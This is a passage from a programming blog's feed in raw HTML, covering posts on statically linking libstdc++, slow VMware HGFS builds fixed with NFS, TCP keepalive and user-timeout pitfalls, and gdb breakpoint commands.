&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gcc -static-libstdc++ -Wl,-Bsymbolic-functions -O3 -shared -fPIC foo.cpp -o foo.so
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I eventually found the real issue: library order during linking. If I manually
specified the &lt;code&gt;libstc++.a&lt;/code&gt; library as the last library, the symbols would not
be resolved via the plt:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gcc -static-libstdc++ -Wl,-Bsymbolic-functions -O3 -shared -fPIC foo.cpp -o foo.so &lt;span class="k"&gt;$(&lt;/span&gt;g++ &lt;span class="nv"&gt;$CXXFLAGS&lt;/span&gt; -print-file-name&lt;span class="o"&gt;=&lt;/span&gt;libstdc++.a&lt;span class="k"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; gdb foo.so --batch --ex &lt;span class="s2"&gt;&amp;quot;disas foo&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;Dump of assembler code for function _Z3foov:&lt;/span&gt;
&lt;span class="go"&gt;   0x00000000000422e0 &amp;lt;+0&amp;gt;: push   %rbp&lt;/span&gt;
&lt;span class="go"&gt;   0x00000000000422e1 &amp;lt;+1&amp;gt;: push   %rbx&lt;/span&gt;
&lt;span class="go"&gt;   0x00000000000422e2 &amp;lt;+2&amp;gt;: sub    $0x8,%rsp&lt;/span&gt;
&lt;span class="go"&gt;   0x00000000000422e6 &amp;lt;+6&amp;gt;: callq  0x42240 &amp;lt;_Z3barv&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;   0x00000000000422eb &amp;lt;+11&amp;gt;:  mov    0x2756ae(%rip),%rbx        # 0x2b79a0&lt;/span&gt;
&lt;span class="go"&gt;   0x00000000000422f2 &amp;lt;+18&amp;gt;:  lea    0x518ef(%rip),%rsi        # 0x93be8&lt;/span&gt;
&lt;span class="go"&gt;   0x00000000000422f9 &amp;lt;+25&amp;gt;:  mov    $0x5,%edx&lt;/span&gt;
&lt;span class="go"&gt;   0x00000000000422fe &amp;lt;+30&amp;gt;:  mov    %rbx,%rdi&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000042301 &amp;lt;+33&amp;gt;:  callq  0x45670 &amp;lt;_ZSt16__ostream_insertIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_PKS3_l&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Specifing this static &lt;code&gt;libstdc++.a&lt;/code&gt; as a final arg worked with both the
&lt;code&gt;#pragma GCC visibility push(hidden)&lt;/code&gt; trick and with &lt;code&gt;-Bsymbolic-functions&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;In &lt;code&gt;./configure&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;I had a &lt;code&gt;./configure&lt;/code&gt; library that I wanted to build with a static &lt;code&gt;libstdc++&lt;/code&gt;. Using
what I learned above, this seemed relatively straightforward:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;./configure CXXFLAGS=&amp;quot;-static-libstc++&amp;quot; LDFLAGS=&amp;quot;-Bsymbolic-functions&amp;quot; LIBS=&amp;quot;$(g++ -print-file-name=libstdc++.a)&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Unfortunately, this didn't work. Using &lt;code&gt;make VERBOSE=1&lt;/code&gt;, I looked at the
command used to link my library and saw the issue: &lt;code&gt;make&lt;/code&gt; was calling
&lt;code&gt;gcc&lt;/code&gt; to link the library rather than &lt;code&gt;ld&lt;/code&gt; but wasn't wrapping &lt;code&gt;LDFLAGS&lt;/code&gt;.
I did so manually and got my expected results, a static &lt;code&gt;libstdc++&lt;/code&gt; where 
none of the symbols were resolved using the PLT. My final &lt;code&gt;configure&lt;/code&gt;
invocation was:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;./configure CXXFLAGS=&amp;quot;-static-libstc++&amp;quot; LDFLAGS=&amp;quot;-Wl,-Bsymbolic-functions&amp;quot; LIBS=&amp;quot;$(g++ -print-file-name=libstdc++.a)&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</content><category term="linking"></category><category term="gcc"></category></entry><entry><title>Why are builds on HGFS so slow?</title><link href="https://codearcana.com/posts/2015/12/04/why-are-builds-on-hgfs-so-slow.html" rel="alternate"></link><published>2015-12-04T00:00:00-08:00</published><updated>2015-12-04T00:00:00-08:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2015-12-04:/posts/2015/12/04/why-are-builds-on-hgfs-so-slow.html</id><summary type="html">&lt;p&gt;We use flame graphs to identify that hgfs is the bottleneck in my build.&lt;/p&gt;</summary><content type="html">&lt;h2&gt;My configuration&lt;/h2&gt;
&lt;p&gt;I work at a company whose product builds and runs exclusively on Linux.
Like most sane people, I prefer to live in a more user-friendly operating
system and my laptop runs Mac OSX. To build my company's product, I use
VMWare Fusion to run an Ubuntu 14.04 virtual machine. I use a local GUI to
edit and search source code, only using the virtual machine to compile
and test the built product. &lt;/p&gt;
&lt;p&gt;Until recently, I kept the files on my virtual machine in sync
with the files on the host machine by using VMWares hgfs kernel module,
which allows a guest to access files on the host (and vice versa).
This configuration causes me no end of grief -- the open-vm-tools ubuntu
package does not include hgfs so I have to manually compile and install
VMWare's tools. This sometimes
&lt;a href="https://github.com/rasa/vmware-tools-patches/issues/29"&gt;breaks&lt;/a&gt; and needs
to be recompiled every time I update my kernel.&lt;/p&gt;
&lt;h2&gt;HGFS performance issues&lt;/h2&gt;
&lt;p&gt;On top of this, the VMWare HGFS has some serious performance issues.
Yesterday, I got fed up with the fact that my incremental builds were
slower than my colleagues and started doing a performance investigation.
An incremental build in which &lt;em&gt;no&lt;/em&gt; files were changed after a successful
build took almost 10 seconds. I noticed my system had incredibly high
CPU utilization and generated a
&lt;a href="http://www.brendangregg.com/flamegraphs.html"&gt;Flame Graph&lt;/a&gt;:&lt;/p&gt;
&lt;p&gt;&lt;object data="https://codearcana.com/images/make_using_hgfs.svg" style="width:100%;"&gt;&lt;/object&gt;&lt;/p&gt;
&lt;p&gt;I was amazed -- all the HGFS stacks were spending time blocked in
&lt;code&gt;mutex_spin_on_owner&lt;/code&gt;. It looks like all file accesses have
to go through a filesystem-wide global lock!&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;
&lt;span class="nf"&gt;HgfsTransportSendRequest&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HgfsReq&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;   &lt;span class="c1"&gt;// IN: Request to send&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;HgfsReq&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;origReq&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;ret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;EIO&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="n"&gt;ASSERT&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;                                                                    
    &lt;span class="n"&gt;ASSERT&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;state&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;HGFS_REQ_STATE_UNSENT&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;                                    
    &lt;span class="n"&gt;ASSERT&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;payloadSize&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bufferSize&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="n"&gt;compat_mutex_lock&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;hgfsChannelLock&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Once I realized this horrible performance pathology, I knew I couldn't use
VMWare HGFS anymore. I set up Mac OSX to share the directory over nfs:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="c1"&gt;# Only share on the vmnet8 subnet and map all accesses to be my user.&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/Volumes/Developer -network 172.16.134.0 -mask 255.255.255.0 -mapall=areece&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sudo tee -a /etc/exports
&lt;span class="gp"&gt;$&lt;/span&gt; sudo nfsd update
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;and mounted the directory on Linux:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;172.16.134.1:/Volumes/Developer /mnt/Developer nfs&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sudo tee -a /etd/fstab
&lt;span class="gp"&gt;$&lt;/span&gt; sudo mount 172.16.134.1:/Volumes/Developer
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This cut my build times down to 1s, almost 10x faster. Here is the revised Flame Graph:&lt;/p&gt;
&lt;p&gt;&lt;object data="https://codearcana.com/images/make_using_nfs.svg" style="width:100%;"&gt;&lt;/object&gt;&lt;/p&gt;</content><category term="profiling"></category><category term="vmware"></category><category term="make"></category></entry><entry><title>TCP Keepalive is a lie</title><link href="https://codearcana.com/posts/2015/08/28/tcp-keepalive-is-a-lie.html" rel="alternate"></link><published>2015-08-28T00:00:00-07:00</published><updated>2015-08-28T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2015-08-28:/posts/2015/08/28/tcp-keepalive-is-a-lie.html</id><summary type="html">&lt;p&gt;In the past few months, I’ve had to debug some gnarly issues related to TCP_KEEPALIVE. Through these issues, I’ve learned that it is harder than one might think to ensure that your sockets fail after a short time when the network is disconnected. This blog post is intended …&lt;/p&gt;</summary><content type="html">&lt;p&gt;In the past few months, I’ve had to debug some gnarly issues related to TCP_KEEPALIVE. Through these issues, I’ve learned that it is harder than one might think to ensure that your sockets fail after a short time when the network is disconnected. This blog post is intended to serve as a cautionary tale.&lt;/p&gt;
&lt;h2&gt;What is TCP_KEEPALIVE and how are we using it?&lt;/h2&gt;
&lt;p&gt;TCP_KEEPALIVE is an optional TCP socket option (disabled by default) intended to prevent servers from (RFC1122, p102):&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[hanging] indefinitely and [consuming] resources unnecessarily if a client crashes or aborts a connection during a network failures&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;When a socket has the option enabled, it will send an empty TCP packet with the ACK bit set after it has been idle for a time period to probe the connection. If that probe is not acknowledged in a short amount of time, additional probes will be sent until one is acknowledged or the connection is determined to be disconnected. TCP_KEEPALIVE is disabled by default and configured with &lt;a href="http://tldp.org/HOWTO/TCP-Keepalive-HOWTO/usingkeepalive.html"&gt;3 parameters in Linux&lt;/a&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;tcp_keepalive_time&lt;/code&gt;, the time in before the first probe is sent (default 2 hours)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;tcp_keepalive_intvl&lt;/code&gt;, the time between probes / how long to wait for a response (default 75 seconds)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;tcp_keepalive_probes&lt;/code&gt;, the number of additional probes to send before failing the connection (default 9)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We enable TCP_KEEPALIVE on our replication sockets because we want to stop replicating when a leaf is unresponsive. Our replication sockets are bi-directional: the master sends the slave new log records every time a transaction is committed and the slave tells the master when it has also committed them. It is important to quickly detect a failed node because we delay transactions on the master if the slave is too far behind. Elsewhere in memsql, we detect failed leaves with a heartbeat that pings every leaf every 10s and fails them if they have not responded after 3 attempts (i.e. after 30 seconds). We configured replication sockets to behave similarly by setting &lt;code&gt;tcp_keepalive_time&lt;/code&gt; and &lt;code&gt;tcp_keepalive_intvl&lt;/code&gt; to 10 seconds &lt;code&gt;tcp_keepalive_probes&lt;/code&gt; to 2 probes (i.e. disconnect after 30 seconds)&lt;/p&gt;
&lt;h2&gt;Why isn't TCP_KEEPALIVE working?&lt;/h2&gt;
&lt;p&gt;The first issue I investigated was that our replication sockets were not disconnecting properly during network failures. I induced a network failure using an &lt;code&gt;iptables&lt;/code&gt; firewall that dropped all packets between the master and a slave. Surprisingly, the master did not fail the slave, even after several minutes had passed. The reason for this was confusing -- the replication socket was still active!&lt;/p&gt;
&lt;p&gt;This behavior was very strange to me, as I would have expected TCP_KEEPALIVE to have disconnected the socket. I dug a little deeper using netstat and saw that the sockets weren't even in the keepalive state.&lt;/p&gt;
&lt;p&gt;At this point, I suspected a programmer bug and installed a &lt;a href="https://github.com/veithen/knetstat"&gt;custom kernel module&lt;/a&gt; to check the socket options on the socket. Sure enough, TCP_KEEPALIVE was enabled.&lt;/p&gt;
&lt;p&gt;I decided to monitor the state of the the socket immediately after I triggered the network failure and I noticed something peculiar: it actually entered the keepalive state after 10 seconds but switched back to the "on" state shortly after.&lt;/p&gt;
&lt;p&gt;What could cause a socket to leave keepalive? Some despondent googling eventually lead me to an an answer: a socket can only be in the keepalive state if it is idle. If there is outstanding data, the socket will be in the on state as it transmits/retransmits the data. A thread on the master was managing to commit a transaction and send a log record to the replication socket, knocking it out of the state keepalive as it tried (unsuccessfully) to retransmit the data to the slave. How long will the socket remain open as we send our packets into the void? Thats controlled by the &lt;code&gt;tcp_retries2&lt;/code&gt; tunable in Linux:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;tcp_retries2&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;integer&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;default&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;15&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;since&lt;/span&gt; &lt;span class="nt"&gt;Linux&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="nc"&gt;.2&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
          &lt;span class="nt"&gt;The&lt;/span&gt; &lt;span class="nt"&gt;maximum&lt;/span&gt; &lt;span class="nt"&gt;number&lt;/span&gt; &lt;span class="nt"&gt;of&lt;/span&gt; &lt;span class="nt"&gt;times&lt;/span&gt; &lt;span class="nt"&gt;a&lt;/span&gt; &lt;span class="nt"&gt;TCP&lt;/span&gt; &lt;span class="nt"&gt;packet&lt;/span&gt; &lt;span class="nt"&gt;is&lt;/span&gt; &lt;span class="nt"&gt;retransmitted&lt;/span&gt; &lt;span class="nt"&gt;in&lt;/span&gt;
          &lt;span class="nt"&gt;established&lt;/span&gt; &lt;span class="nt"&gt;state&lt;/span&gt; &lt;span class="nt"&gt;before&lt;/span&gt; &lt;span class="nt"&gt;giving&lt;/span&gt; &lt;span class="nt"&gt;up&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nt"&gt;The&lt;/span&gt; &lt;span class="nt"&gt;default&lt;/span&gt; &lt;span class="nt"&gt;value&lt;/span&gt; &lt;span class="nt"&gt;is&lt;/span&gt; &lt;span class="nt"&gt;15&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
          &lt;span class="nt"&gt;which&lt;/span&gt; &lt;span class="nt"&gt;corresponds&lt;/span&gt; &lt;span class="nt"&gt;to&lt;/span&gt; &lt;span class="nt"&gt;a&lt;/span&gt; &lt;span class="nt"&gt;duration&lt;/span&gt; &lt;span class="nt"&gt;of&lt;/span&gt; &lt;span class="nt"&gt;approximately&lt;/span&gt; &lt;span class="nt"&gt;between&lt;/span&gt; &lt;span class="nt"&gt;13&lt;/span&gt; &lt;span class="nt"&gt;to&lt;/span&gt;
          &lt;span class="nt"&gt;30&lt;/span&gt; &lt;span class="nt"&gt;minutes&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;depending&lt;/span&gt; &lt;span class="nt"&gt;on&lt;/span&gt; &lt;span class="nt"&gt;the&lt;/span&gt; &lt;span class="nt"&gt;retransmission&lt;/span&gt; &lt;span class="nt"&gt;timeout&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nt"&gt;The&lt;/span&gt;
          &lt;span class="nt"&gt;RFC&lt;/span&gt; &lt;span class="nt"&gt;1122&lt;/span&gt; &lt;span class="nt"&gt;specified&lt;/span&gt; &lt;span class="nt"&gt;minimum&lt;/span&gt; &lt;span class="nt"&gt;limit&lt;/span&gt; &lt;span class="nt"&gt;of&lt;/span&gt; &lt;span class="nt"&gt;100&lt;/span&gt; &lt;span class="nt"&gt;seconds&lt;/span&gt; &lt;span class="nt"&gt;is&lt;/span&gt; &lt;span class="nt"&gt;typically&lt;/span&gt;
          &lt;span class="nt"&gt;deemed&lt;/span&gt; &lt;span class="nt"&gt;too&lt;/span&gt; &lt;span class="nt"&gt;short&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So our socket was stuck uselessly retransmitting packets and wasn't getting disconnected for half an hour! Unfortunately it &lt;a href="http://stackoverflow.com/a/5907951/447288"&gt;appears&lt;/a&gt; that it is not possible to set &lt;code&gt;tcp_retries2&lt;/code&gt; on a per socket basis, but we can use a different socket option. If the TCP_USERTIMEOUT option is set on a socket, the socket will automatically disconnect if transmitted data is not acknowledged within that many seconds. We set it to 30 seconds to match the our heartbeat logic.&lt;/p&gt;
&lt;h2&gt;TCP_KEEPALIVE is super effective!&lt;/h2&gt;
&lt;p&gt;Now that our sockets were properly terminating during network failures, we started noticing another perplexing issue. In some environments, we saw connections time out after -1 seconds (i.e. with an infinite timeout set). &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Leaf error: timed out from socket after -1 seconds&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We managed to set up a cluster on EC2 that could reproduce the issue by performing 100 simultaneous full table scans, each of which took over a minute to iterate over a many gigabyte linked list. Our logs showed that a non-blocking &lt;code&gt;recv&lt;/code&gt; syscall was failing with ETIMEDOUT. This type of failure can only occur if a socket fails due to a timeout (e.g. TCP_KEEPALIVE or a retransmission timeout).&lt;/p&gt;
&lt;p&gt;I took a quick stock of our system, following Brendan Gregg’s &lt;a href="http://www.brendangregg.com/usemethod.html"&gt;USE method&lt;/a&gt;. Each leaf had many gigabytes of free memory and there was no disk activity. The CPUs on the leaves were 100% utilized running the full table scans and the load average was quite high (~2400) because each table scan used many CPU-bound threads. The network was very under-utilized (~5KB/s and ~10 packets/s according &lt;code&gt;nicstat&lt;/code&gt;) and there were no TCP retransmissions during the connection failures.&lt;/p&gt;
&lt;p&gt;Since CPU was the only interesting resource, I focused on it. Could user processes somehow be starving the kernel of CPU and preventing it from responding to keepalive packets? I spent some time reading about how Linux handles interrupts after I saw the &lt;code&gt;ksoftirqd&lt;/code&gt; process executing. Linux splits interrupts&lt;sup id="fnref-1"&gt;&lt;a class="footnote-ref" href="#fn-1"&gt;1&lt;/a&gt;&lt;/sup&gt;into two parts: the hardware interrupt that does very little work and a “soft” interrupt that handles the interesting logic. Most of the time these “soft” interrupts are handled immediately before returning from the kernel after the hardware interrupt; however, Linux restricts the number of “soft” interrupts that can be processed at a time to prevent interrupts from starving user traffic. Remaining “soft” interrupts can be processed by the &lt;code&gt;ksoftirqd&lt;/code&gt; process which runs at the same priority as the default user processes. Could user threads (e.g. &lt;code&gt;memsqld&lt;/code&gt;) be starving &lt;code&gt;ksoftirqd&lt;/code&gt;?&lt;/p&gt;
&lt;p&gt;The theory went like this: since the Linux scheduler&lt;sup id="fnref-2"&gt;&lt;a class="footnote-ref" href="#fn-2"&gt;2&lt;/a&gt;&lt;/sup&gt; executes processes of the same priority in round robin fashion and uses a default time slice of 100ms, a run queue of 2400 constitutes a 10 second scheduler latency! If the ksoftirqd processes were only getting scheduled every 10s, then we wouldn’t be responding to the TCP keepalive requests in time. To confirm or deny this theory, I measured the scheduler latency of the &lt;code&gt;ksoftirqd&lt;/code&gt; processes using &lt;code&gt;perf sched&lt;/code&gt;. Unfortunately, their maximum scheduler latency was measured in &lt;em&gt;milliseconds&lt;/em&gt;, firmly disproving the theory.&lt;/p&gt;
&lt;p&gt;I started using wireshark to examine the network traffic and noticed something fishy: &lt;em&gt;all&lt;/em&gt; of the keepalive packet’s were getting sent at the same time. I had an eureka moment: enabling TCP_KEEPALIVE with static timers on all connections meant that all connections fired their keepalive timers at the same time, leading to momentary network congestion and packet drops. Once I understood the issue, it was easy to suggest some fixes: add some jitter to the timers and make sure the &lt;code&gt;tcp_keepalive_intvl&lt;/code&gt; was relatively prime to &lt;code&gt;tcp_keepalive_time&lt;/code&gt;. Both of these ensure that keep alive probes on multiple connections won't fire in lockstep.&lt;/p&gt;
&lt;h2&gt;Takeaways&lt;/h2&gt;
&lt;p&gt;TCP is a protocol that has a lot of features built into it, but resiliency to network partitions is not one of them. Properly tuning TCP to close connections in the face of network partitions is challenging and understanding what is going on is even harder.  Despite these challenges, TCP_KEEPALIVE can be configured to live up to its goal of aborting connections during network failures.&lt;/p&gt;
&lt;div class="footnote"&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id="fn-1"&gt;
&lt;p&gt;For more information on the networking stack, see the excellent packagecloud.io blog posts on the Linux networking stack for &lt;a href="https://blog.packagecloud.io/eng/2017/02/06/monitoring-tuning-linux-networking-stack-sending-data/"&gt;&lt;code&gt;send&lt;/code&gt;&lt;/a&gt; and &lt;a href="https://blog.packagecloud.io/eng/2016/06/22/monitoring-tuning-linux-networking-stack-receiving-data/"&gt;&lt;code&gt;receive&lt;/code&gt;&lt;/a&gt;.&amp;#160;&lt;a class="footnote-backref" href="#fnref-1" title="Jump back to footnote 1 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-2"&gt;
&lt;p&gt;For more information on the internals of the Linux scheduler, see &lt;a href="https://tampub.uta.fi/bitstream/handle/10024/96864/GRADU-1428493916.pdf"&gt;this fantastic survey paper&lt;/a&gt; by Nikita Ishkov.&amp;#160;&lt;a class="footnote-backref" href="#fnref-2" title="Jump back to footnote 2 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;</content><category term="tcp"></category><category term="linux"></category><category term="networking"></category><category term="perf_events"></category></entry><entry><title>gdb breakpoint commands and conditional breakpoints</title><link href="https://codearcana.com/posts/2015/05/16/gdb-breakpoint-commands-and-conditional-breakpoints.html" rel="alternate"></link><published>2015-05-16T00:00:00-07:00</published><updated>2015-05-16T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2015-05-16:/posts/2015/05/16/gdb-breakpoint-commands-and-conditional-breakpoints.html</id><summary type="html">&lt;p&gt;During my first week at my new job, I had the opportunity to teach some of my new coworkers about &lt;code&gt;gdb&lt;/code&gt; breakpoint commands and conditional breakpoints. I had a lot of fun teaching these techniques my friends here and thought others might find the story enjoyable as well.&lt;/p&gt;
&lt;h2&gt;Breakpoint commands …&lt;/h2&gt;</summary><content type="html">&lt;p&gt;During my first week at my new job, I had the opportunity to teach some of my new coworkers about &lt;code&gt;gdb&lt;/code&gt; breakpoint commands and conditional breakpoints. I had a lot of fun teaching these techniques my friends here and thought others might find the story enjoyable as well.&lt;/p&gt;
&lt;h2&gt;Breakpoint commands&lt;/h2&gt;
&lt;p&gt;The first question I had was: &lt;em&gt;where is our server doing reads&lt;/em&gt;? To answer this question, I used an often overlooked feature of &lt;code&gt;gdb&lt;/code&gt;: breakpoint commands. At a high level, these allowed us to run an arbitrary set of &lt;code&gt;gdb&lt;/code&gt; command automatically when a break point is hit. In my case, I wanted to see what stack trace was causing the reads:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;(gdb) break read
Breakpoint 2 at 0x7ffff7382960: file ../sysdeps/unix/syscall-template.S, line 82.
(gdb) commands
End with a line saying just &amp;quot;end&amp;quot;.
&amp;gt;backtrace
&amp;gt;continue
&amp;gt;end
(gdb)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I put a breakpoint on the &lt;code&gt;libc&lt;/code&gt; &lt;code&gt;read&lt;/code&gt; function call and automatically do two things: print the backtrace of the thread that hit the read and then continue execution. The overall effect of this is that &lt;code&gt;gdb&lt;/code&gt; runs the program as normal but prints a backtrace every time the program reads:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Breakpoint 1, read () at ../sysdeps/unix/syscall-template.S:82
82 ../sysdeps/unix/syscall-template.S: No such file or directory.
#0  read () at ../sysdeps/unix/syscall-template.S:82
#1  0x00007ffff7324ed8 in _IO_new_file_underflow (fp=0x7ffff76386c0)
    at fileops.c:606
#2  0x00007ffff73265be in _IO_default_uflow (fp=0x0) at genops.c:440
#3  0x00007ffff731da9b in _IO_getc (fp=0x7ffff76386c0) at getc.c:41
#4  0x00007ffff7b6e63d in __gnu_cxx::stdio_sync_filebuf&amp;lt;char, std::char_traits&amp;lt;char&amp;gt; &amp;gt;::underflow() () from /usr/lib/x86_64-linux-gnu/libstdc++.so.6
#5  0x00007ffff7b58c17 in std::istream::sentry::sentry(std::istream&amp;amp;, bool) ()
   from /usr/lib/x86_64-linux-gnu/libstdc++.so.6
#6  0x00007ffff7b59b4b in std::istream::operator&amp;gt;&amp;gt;(int&amp;amp;) ()
   from /usr/lib/x86_64-linux-gnu/libstdc++.so.6
#7  0x0000000000400905 in main ()
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Conditional breakpoints&lt;/h2&gt;
&lt;p&gt;I also noticed it was opening an interesting file, so I wanted break into a debugger to inspect the program to figure out why. Unfortunately, it opens a &lt;em&gt;lot&lt;/em&gt; of files (logs, etc), so I needed a way to filter out only the interesting calls to &lt;code&gt;open&lt;/code&gt;. To do this, I used &lt;code&gt;gdb&lt;/code&gt; conditional breakpoints. The example below creates a breakpoint on &lt;code&gt;open&lt;/code&gt; that only triggers if &lt;code&gt;/home/alex&lt;/code&gt; is a substring in the filename:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;(gdb) break open if strstr(&lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;rdi&lt;/span&gt;&lt;span class="x"&gt;, &amp;quot;/home/alex&amp;quot;)&lt;/span&gt;
&lt;span class="x"&gt;Breakpoint 1 at 0x7ffff7382770: file ../sysdeps/unix/syscall-template.S, line 82.&lt;/span&gt;
&lt;span class="x"&gt;(gdb) continue&lt;/span&gt;
&lt;span class="x"&gt;Breakpoint 1, open64 () at ../sysdeps/unix/syscall-template.S:82&lt;/span&gt;
&lt;span class="x"&gt;82 ../sysdeps/unix/syscall-template.S: No such file or directory.&lt;/span&gt;
&lt;span class="x"&gt;(gdb) x/s &lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;rdi&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;span class="x"&gt;0x400b7c:  &amp;quot;/home/alex/a.out&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This example takes advantage of two more pieces of &lt;code&gt;gdb&lt;/code&gt; functionality:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;gdb&lt;/code&gt; can call an arbitrary function (in this case, we call the &lt;code&gt;libc&lt;/code&gt; &lt;code&gt;strstr&lt;/code&gt; function to compute substring).&lt;/li&gt;
